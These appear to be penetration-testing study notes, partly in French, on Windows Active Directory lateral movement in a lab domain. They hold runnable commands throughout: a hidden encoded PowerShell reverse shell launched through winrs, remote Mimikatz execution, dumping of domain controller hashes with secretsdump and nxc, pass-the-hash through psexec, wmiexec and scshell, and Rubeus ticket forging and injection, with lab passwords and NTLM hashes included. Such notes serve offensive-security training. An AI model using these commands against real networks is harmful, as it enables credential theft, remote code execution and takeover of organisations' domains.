
# En fonction du groupe auquel appartient un utilisateur
En fonction du groupe d'un utilisateur, on poura prendre ses droits sur les protocole suivant :


| Group Membership        | Lateral Movement Technique              | Tools                                                         |
| ----------------------- | --------------------------------------- | ------------------------------------------------------------- |
| Remote Desktop Users    | RDP                                     | Remimina ou xfreerdp3                                         |
| Remote Management Users | WinRM                                   | winrs, psremoting, evil-winrm                                 |
| Regular Domain Users    | SSH                                     | ssh command                                                   |
| Local Administrators    | PTH ou Over-PTH (SCM, WMI, DCOM) ou PTT | impacket-psexec, impacket-wmiexec, impacket-dcomexec, scshell |
|                         |                                         |                                                               |

# winRS
On fait un reverse shell : https://cyberchef.io/ avec UTF16LE + base64
```bash
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBD..snip..snip..snip..AZQAoACkA"
```

# PSRemoting
PowerShell Remoting (PSRemoting) allows administrators to run PowerShell commands and scripts on remote Windows systems.
A PowerShell session is created on the remote system (runspace), where commands execute in the context of the authenticated user

```Powershell
> cred = Get-Credential
> $username = "jen"
> $password = "Nexus123!"
> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force
> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
> $files04 = New-PSSession -ComputerName files04.corp.com -Credential $credential
> Enter-PSSession -Session $files04

```
Note: We can run commands using Invoke-Command on all machines in parallel using the following syntax:
Invoke-Command -Scriptblock {hostname} -ComputerName (Get-Content .\ips.txt) -Credential $credential

```powershell
> . .\Invoke-Mimikatz.ps1
> Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $files04
```

This command will run Invoke-Mimikatz.ps1 which was loaded on client75 but it was executed on files04 machine.

# Pass the Hash

NXC and impacket dump hashes and SID-ID from DC1 as jeffadmin (assumed breach)
```bash

$ nxc smb 192.168.X.70 -u jeffadmin -p 'BrouhahaTungPerorateBroom2023!' -M ntdsutil

$ impacket-secretsdump corp.com/jeffadmin:'BrouhahaTungPerorateBroom2023!'@192.168.X.70

$ impacket-lookupsid corp.com/jeffadmin:'BrouhahaTungPerorateBroom2023!'@192.168.X.70
```
The LocalAccountTokenFilterPolicy controls how local accounts are treated when they authenticate remotely using NTLM
```bash
impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.X.73

impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.X.73
```

```bash
$ python3 scshell.py administrator@192.168.X.73 -hashes :2892D26CDF84D7A70E2EB3B9F05C425E -service-name defragsvc
```

# Overpass the Hash
Overpass-the-Hash (OVER-PTH) is a technique that uses an NTLM hash to obtain Kerberos tickets instead of authenticating directly
with NTLM.
OVER-PTH converts an NTLM hash into Kerberos access, enabling stealthier domain authentication without the plaintext password.

**Ask for TGT with password/hash using Rubeus**
```powershell
.\Rubeus.exe asktgt /user:jen /password:'Nexus123!' /domain:corp.com /outfile:ticket.kirbi
.\Rubeus.exe asktgt /user:jen /rc4:369DEF79D8372408BF6E93364CC93075 /domain:corp.com /outfile:ticket2.kirbi
```
Note: hash for jen can be looted with Rubeus also à 
```
.\Rubeus.exe hash /user:jen /password:'Nexus123!' /domain:corp.com
```
Inject ticket in memory with Rubeus
```powershell
.\Rubeus.exe describe /ticket:ticket.kirbi
.\Rubeus.exe purge
.\Rubeus.exe ptt /ticket:ticket.kirbi
.\Rubeus.exe purge
.\Rubeus.exe ptt /ticket:ticket2.kirbi
```
Testing to show it worked before/after injecting
```powershell
$files04 = New-PSSession -ComputerName files04.corp.com
Enter-PSSession -Session $files04
```

